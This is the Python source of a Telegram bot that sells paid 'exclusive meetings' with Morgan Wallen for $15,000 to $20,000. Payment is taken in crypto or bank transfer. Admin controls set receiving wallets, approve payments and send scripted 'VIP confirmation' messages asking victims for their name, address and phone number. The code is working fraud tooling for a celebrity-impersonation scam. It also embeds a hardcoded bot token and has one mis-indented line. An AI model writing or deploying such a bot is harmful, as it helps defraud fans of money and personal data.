From telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
import sqlite3
from datetime import datetime, timedelta
import os
import threading
import urllib.request
import json
from flask import Flask

# ================= RENDER HEARTBEAT =================
server = Flask(__name__)
@server.route('/')
def health_check(): return "Alive", 200

# ================= SETTINGS =================
TOKEN = "8681446523:AAHs42JckBFG_n-OYsASEbv-6Q4eFUlE5tw"
ADMIN_IDS = [7936558915]

def is_admin(user_id): return user_id in ADMIN_IDS

# ================= BTC PRICE CONVERTER =================
def get_btc_amount(usd_amount):
    try:
        url = "https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        response = urllib.request.urlopen(req)
        data = json.loads(response.read())
        btc_price = float(data['price'])
        return f"{round(usd_amount / btc_price, 6)} BTC"
    except Exception:
        return f"${usd_amount} (BTC equivalent)"

# ================= DATABASE =================
conn = sqlite3.connect("bot.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, blocked INTEGER DEFAULT 0)")
cursor.execute("CREATE TABLE IF NOT EXISTS wallets (coin TEXT PRIMARY KEY, address TEXT, memo TEXT)")
cursor.execute("CREATE TABLE IF NOT EXISTS settings (id INTEGER PRIMARY KEY, rej_msg TEXT, app_msg TEXT, price_meet INTEGER, price_biz INTEGER)")

# Safe Database update for new Network and Guide features
try: cursor.execute("ALTER TABLE wallets ADD COLUMN network TEXT")
except: pass
try: cursor.execute("ALTER TABLE wallets ADD COLUMN guide TEXT")
except: pass

default_app = "🎉 **Payment Confirmed Successfully**\n\n━━━━━━━━━━━━━━━━━━\n👑 **VIP CONFIRMATION NOTICE**\n━━━━━━━━━━━━━━━━━━\n\nDear User,\n\nYour payment has been successfully verified. Your exclusive meeting with **Morgan Wallen** is now officially scheduled.\n\n📅 **Scheduled Date:** {date}\n\n🎫 **VIP Recognition Card:**\nA VIP Fan Card will be issued as your official form of recognition and identification for the meeting. This card will be prepared and shipped to you within the next **2 days**.\n\n📦 **Shipping & Delivery:**\nPersonal details such as your **Full Name, Shipping Address, and Phone Number** must be provided by you once the card is ready for dispatch to ensure a secure delivery.\n\nThank you for your trust. We look forward to delivering a premium experience.\n\n━━━━━━━━━━━━━━━━━━\nStatus: **CONFIRMED ✅**"
cursor.execute("INSERT OR IGNORE INTO settings (id, price_meet, price_biz, app_msg) VALUES (1, 15000, 20000, ?)", (default_app,))
conn.commit()

def get_wallet(coin):
    cursor.execute("SELECT address, memo FROM wallets WHERE coin=?", (coin,))
    row = cursor.fetchone()
    return row if row else ("NOT SET", None)

def get_prices():
    cursor.execute("SELECT price_meet, price_biz FROM settings WHERE id=1")
    res = cursor.fetchone()
    return res if res else (15000, 20000)

def is_blocked(user_id):
    cursor.execute("SELECT blocked FROM users WHERE user_id=?", (user_id,))
    row = cursor.fetchone()
    return row[0] == 1 if row else False

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_blocked(user_id): return

    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    conn.commit()

    user = update.effective_user
    username = f"@{user.username}" if user.username else "No Username"
    
    if not is_admin(user_id):
        for admin in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    chat_id=admin,
                    text=f"🔔 **New User Alert!**\n👤 **Name:** {user.first_name}\n🔗 **Username:** {username}\n🆔 **ID:** `{user_id}`",
                    parse_mode="Markdown"
                )
            except: pass

    keyboard = [[InlineKeyboardButton("🎯 Book Meeting", callback_data="book")]]
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
        
    welcome_text = (
        f"Welcome, {user.first_name}.\n\n"
        "Thank you for your interest in scheduling an exclusive meeting. "
        "Please select the option below to proceed with your booking."
    )
    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard))

# ================= CALLBACKS =================
async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    if not is_admin(user_id) and is_blocked(user_id): return
    
    await query.answer()
    data = query.data

    if data.startswith("copy_"):
        val = data.replace("copy_", "")
        await query.message.reply_text(f"`{val}`", parse_mode="MarkdownV2")
        return

    # ADMIN PANEL
    if data == "admin_panel" and is_admin(user_id):
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE blocked=1")
        blocked_users = cursor.fetchone()[0]
        
        kb = [[InlineKeyboardButton("💰 Prices", callback_data="edit_prices"), InlineKeyboardButton("💳 Wallets", callback_data="wallet_menu")],
              [InlineKeyboardButton("💬 DM User", callback_data="dm_user"), InlineKeyboardButton("🚫 Block Manager", callback_data="block_mgmt")],
              [InlineKeyboardButton("✅ Edit Approval", callback_data="set_app_msg"), InlineKeyboardButton("❌ Edit Reject", callback_data="set_rej_msg")],
              [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")]]
        
        admin_info = f"📊 **Admin Panel**\n👤 Admin ID: `{user_id}`\n👥 Total Users: `{total_users}`\n🚫 Blocked Users: `{blocked_users}`"
        await query.edit_message_text(admin_info, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "block_mgmt" and is_admin(user_id):
        context.user_data["step"] = "input_block_id"
        await query.edit_message_text("🚫 Enter the **User ID** you wish to manage:")

    elif data.startswith("do_block_") and is_admin(user_id):
        target = data.split("_")[2]
        cursor.execute("UPDATE users SET blocked = 1 WHERE user_id = ?", (target,))
        conn.commit()
        await query.edit_message_text(f"🚫 User `{target}` has been **Blocked**.", parse_mode="Markdown")

    elif data.startswith("do_unblock_") and is_admin(user_id):
        target = data.split("_")[2]
        cursor.execute("UPDATE users SET blocked = 0 WHERE user_id = ?", (target,))
        conn.commit()
        await query.edit_message_text(f"✅ User `{target}` has been **Unblocked**.", parse_mode="Markdown")

    elif data == "set_app_msg" and is_admin(user_id):
        context.user_data["step"] = "setting_app_msg"
        await query.edit_message_text("📥 Send new Approval Message (Use {date} for the timestamp):")

    elif data == "wallet_menu" and is_admin(user_id):
        kb = [[InlineKeyboardButton("BTC", callback_data="manage_BTC"), InlineKeyboardButton("ETH", callback_data="manage_ETH")],
              [InlineKeyboardButton("USDT", callback_data="manage_USDT"), InlineKeyboardButton("Bank", callback_data="manage_Bank")],
              [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]
        await query.edit_message_text("Select asset to edit:", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "edit_prices" and is_admin(user_id):
        p_meet, p_biz = get_prices()
        kb = [[InlineKeyboardButton(f"Meet & Greet (${p_meet})", callback_data="setp_meet")],
              [InlineKeyboardButton(f"Business (${p_biz})", callback_data="setp_biz")],
              [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]
        await query.edit_message_text("Select price to update:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("setp_") and is_admin(user_id):
        context.user_data["step"] = data
        await query.edit_message_text("🔢 Send the new price (Numbers only):")

    elif data == "dm_user" and is_admin(user_id):
        context.user_data["step"] = "dm_id"
        await query.edit_message_text("🆔 Send the **User ID** you want to message:")

    elif data.startswith("reply_") and is_admin(user_id):
        target = data.split("_")[1]
        context.user_data["target_dm"] = target
        context.user_data["step"] = "dm_msg"
        await query.message.reply_text(f"📝 Replying to `{target}`. Send your message:")

    elif data.startswith("manage_") and is_admin(user_id):
        coin = data.split("_")[1]
        addr, memo = get_wallet(coin)
        
        cursor.execute("SELECT network, guide FROM wallets WHERE coin=?", (coin,))
        extra = cursor.fetchone()
        network = extra[0] if extra and extra[0] else "Default"
        guide_status = "Custom Set" if extra and extra[1] else "Default"

        kb = [[InlineKeyboardButton("📝 Set Address", callback_data=f"setaddr_{coin}")],
              [InlineKeyboardButton("📝 Set Memo", callback_data=f"setmemo_{coin}")],
              [InlineKeyboardButton("🌐 Set Network ✅", callback_data=f"setnet_{coin}")],
              [InlineKeyboardButton("📘 Set Guide ✅", callback_data=f"setguide_{coin}")],
              [InlineKeyboardButton("⬅️ Back", callback_data="wallet_menu")]]
        await query.edit_message_text(f"💎 **{coin}**\nAddr: `{addr}`\nMemo: `{memo}`\nNetwork: `{network}`\nGuide: `{guide_status}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data.startswith("setaddr_") or data.startswith("setmemo_") or data.startswith("setnet_") or data.startswith("setguide_"):
        parts = data.split("_")
        action = parts[0]
        coin = parts[1]
        field_map = {"setaddr": "address", "setmemo": "memo", "setnet": "network", "setguide": "guide"}
        field = field_map[action]
        context.user_data["edit_target"] = (coin, field)
        await query.edit_message_text(f"📥 Send new value for {field.capitalize()} ({coin}):")

    elif data == "set_rej_msg" and is_admin(user_id):
        context.user_data["step"] = "setting_rej_msg"
        await query.edit_message_text("📥 Send the new Rejection Message:")

    elif data == "broadcast" and is_admin(user_id):
        context.user_data["step"] = "broadcasting"
        await query.edit_message_text("📢 Send message for ALL users:")

    elif data.startswith("guide_"):
        coin = data.split("_")[1]
        cursor.execute("SELECT network, guide FROM wallets WHERE coin=?", (coin,))
        extra = cursor.fetchone()
        custom_net = extra[0] if extra and extra[0] else None
        custom_guide = extra[1] if extra and extra[1] else None

        net_info = custom_net if custom_net else {"BTC": "Bitcoin Network", "ETH": "Ethereum (ERC20) Network", "USDT": "Tron (TRC20) Network"}.get(coin, "the correct network")
        
        if custom_guide:
            guide_text = custom_guide
        else:
            guide_text = (
                f"📘 **Official {coin} Payment Guide**\n\n"
                f"To complete your booking, please follow these professional steps to ensure your {coin} transfer is successful:\n\n"
                f"1️⃣ **Access Your Wallet:** Open your preferred Cryptocurrency exchange (Bybit, Binance, Coinbase) or personal wallet (Trust Wallet, Ledger).\n\n"
                f"2️⃣ **Initiate Transfer:** Select **Withdraw** or **Send** and choose **{coin}** from your asset list.\n\n"
                f"3️⃣ **Select Network:** This is a critical step. Ensure you select the **{net_info}**. Sending funds via the wrong network will result in a permanent loss of funds.\n\n"
                f"4️⃣ **Recipient Details:** Copy the Wallet Address provided in your invoice and paste it into the recipient field. If your invoice includes a **Memo/Tag**, you MUST include it.\n\n"
                f"5️⃣ **Finalize:** Enter the exact amount shown on your invoice, review the transaction, and tap **Confirm**.\n\n"
                f"⚠️ **Note:** Transfers typically take 10-30 minutes to reflect on the blockchain. Once you receive a 'Success' notification in your wallet, click the **Confirm Payment** button below."
            )
        await query.message.reply_text(guide_text, parse_mode="Markdown")

    # USER UI
    elif data == "book":
        p_meet, p_biz = get_prices()
        kb = [[InlineKeyboardButton(f"Meet & Greet (${p_meet})", callback_data="type_meet")], 
              [InlineKeyboardButton(f"Business (${p_biz})", callback_data="type_business")]]
        await query.edit_message_text("Choose meeting type:", reply_markup=InlineKeyboardMarkup(kb))

    elif data in ["type_meet", "type_business"]:
        context.user_data["meeting_type"] = "Meet & Greet" if data == "type_meet" else "Business"
        context.user_data["step"] = "reason"
        await query.edit_message_text("Send your reason for the meeting:")

    elif data.startswith("pay_"):
        coin = data.split("_")[1]
        reason = context.user_data.get("reason_text", "No reason provided")
        
        # RESTORED WALLET VIEWING ALERT
        if not is_admin(user_id):
            for admin in ADMIN_IDS:
                try: 
                    await context.bot.send_message(chat_id=admin, text=f"💳 **Activity Alert**\nUser: `{user_id}`\nAction: Viewing {coin} payment option\nReason: {reason}", parse_mode="Markdown")
                except: 
                    pass

        p_meet, p_biz = get_prices()
        m_type = context.user_data.get("meeting_type", "Meet & Greet")
        price = p_meet if m_type == "Meet & Greet" else p_biz
        addr, memo = get_wallet(coin)

        if coin == "Bank" and addr == "NOT SET":
            await query.message.reply_text("Unavailable due to network issues.")
            return

        display_price = get_btc_amount(price) if coin == "BTC" else f"${price}"
        kb = [[InlineKeyboardButton("📋 Copy Address", callback_data=f"copy_{addr}")]]
        if memo: kb.append([InlineKeyboardButton("📋 Copy Memo", callback_data=f"copy_{memo}")])
        if coin != "Bank": kb.append([InlineKeyboardButton("📘 Payment Guide", callback_data=f"guide_{coin}")])
        kb.append([InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm_payment")])
        
        await query.message.reply_text(f"🧾 **Invoice**\nType: {m_type}\nAmount: {display_price}\nCoin: {coin}\n\n📍 **Addr:** `{addr}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "confirm_payment":
        reason = context.user_data.get("reason_text", "N/A")
        for admin in ADMIN_IDS:
            kb = [[InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}")],
                  [InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")]]
            await context.bot.send_message(chat_id=admin, text=f"🧾 **Payment Alert**\nUser: `{user_id}`\nReason: {reason}", reply_markup=InlineKeyboardMarkup(kb))
        await query.edit_message_text("⏳ Awaiting admin approval...")

    elif data.startswith("approve_") and is_admin(user_id):
        target = int(data.split("_")[1])
        cursor.execute("SELECT app_msg FROM settings WHERE id=1")
        row = cursor.fetchone()
        date = (datetime.now() + timedelta(days=5)).strftime('%Y-%m-%d %H:%M')
        msg = row[0].replace("{date}", date) if row else "Confirmed."
        await context.bot.send_message(chat_id=target, text=msg, parse_mode="Markdown")
        await query.edit_message_text(f"✅ Approved for {target}")

    elif data.startswith("reject_") and is_admin(user_id):
        target = int(data.split("_")[1])
        cursor.execute("SELECT rej_msg FROM settings WHERE id=1")
        row = cursor.fetchone()
        txt = row[0] if row and row[0] else "❌ Rejected."
        await context.bot.send_message(chat_id=target, text=txt, parse_mode="Markdown")
        await query.edit_message_text(f"❌ Rejected for {target}")

# ================= HANDLERS =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id) and is_blocked(user_id): return
    text = update.message.text
    step = context.user_data.get("step")

    if is_admin(user_id):
        if context.user_data.get("edit_target"):
            coin, field = context.user_data.pop("edit_target")
            if field == "address": 
                cursor.execute("INSERT INTO wallets (coin, address) VALUES (?, ?) ON CONFLICT(coin) DO UPDATE SET address=excluded.address", (coin, text))
            else: 
                cursor.execute("INSERT OR IGNORE INTO wallets (coin) VALUES (?)", (coin,))
                cursor.execute(f"UPDATE wallets SET {field} = ? WHERE coin = ?", (text, coin))
            conn.commit()
            await update.message.reply_text(f"✅ {coin} {field.capitalize()} updated!")
        
        elif step == "input_block_id":
            context.user_data["step"] = None
            kb = [[InlineKeyboardButton("🚫 Block", callback_data=f"do_block_{text}"), 
                   InlineKeyboardButton("✅ Unblock", callback_data=f"do_unblock_{text}")]]
            await update.message.reply_text(f"Choose action for User `{text}`:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

        elif step == "setting_app_msg":
            cursor.execute("UPDATE settings SET app_msg = ? WHERE id = 1", (text,))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ Approval Message updated!")

        elif step and step.startswith("setp_"):
            field = "price_meet" if "meet" in step else "price_biz"
            cursor.execute(f"UPDATE settings SET {field} = ? WHERE id = 1", (int(text),))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ Price updated!")

        elif step == "dm_id":
            context.user_data["target_dm"] = text
            context.user_data["step"] = "dm_msg"
            await update.message.reply_text(f"📝 Message for `{text}`:")

        elif step == "dm_msg":
            target = context.user_data.pop("target_dm")
            context.user_data["step"] = None
            try:
                await context.bot.send_message(chat_id=target, text=text, parse_mode="Markdown")
                await update.message.reply_text("✅ Sent!")
            except: await update.message.reply_text("❌ Failed.")

        elif step == "setting_rej_msg":
            cursor.execute("UPDATE settings SET rej_msg = ? WHERE id = 1", (text,))
            conn.commit(); context.user_data["step"] = None
            await update.message.reply_text("✅ Rejection Message saved!")

        elif step == "broadcasting":
            cursor.execute("SELECT user_id FROM users WHERE blocked=0")
            for (u,) in cursor.fetchall():
                try: await context.bot.send_message(chat_id=u, text=text)
                except: pass
            context.user_data["step"] = None
            await update.message.reply_text("📢 Broadcast sent!")

    elif step == "reason":
        context.user_data["reason_text"] = text
        context.user_data["step"] = None
        kb = [[InlineKeyboardButton("BTC", callback_data="pay_BTC")], [InlineKeyboardButton("ETH", callback_data="pay_ETH")], 
              [InlineKeyboardButton("USDT", callback_data="pay_USDT")], [InlineKeyboardButton("Bank", callback_data="pay_Bank")]]
        await update.message.reply_text("Choose payment method:", reply_markup=InlineKeyboardMarkup(kb))
    
    elif not is_admin(user_id):
        for admin in ADMIN_IDS:
                        kb = [[InlineKeyboardButton("↩️ Reply", callback_data=f"reply_{user_id}")]]
            try:
                await context.bot.send_message(
                    chat_id=admin, 
                    text=f"📩 **New Message from {update.effective_user.first_name}** (`{user_id}`)\n\n💬 {text}", 
                    reply_markup=InlineKeyboardMarkup(kb),
                    parse_mode="Markdown"
                )
            except: 
                pass

# ================= MAIN EXECUTION =================
if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()

    # Add Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    # Start the Flask server for Render
    threading.Thread(target=lambda: server.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()

    print("🚀 Bot is live...")
    app.run_polling(drop_pending_updates=True)
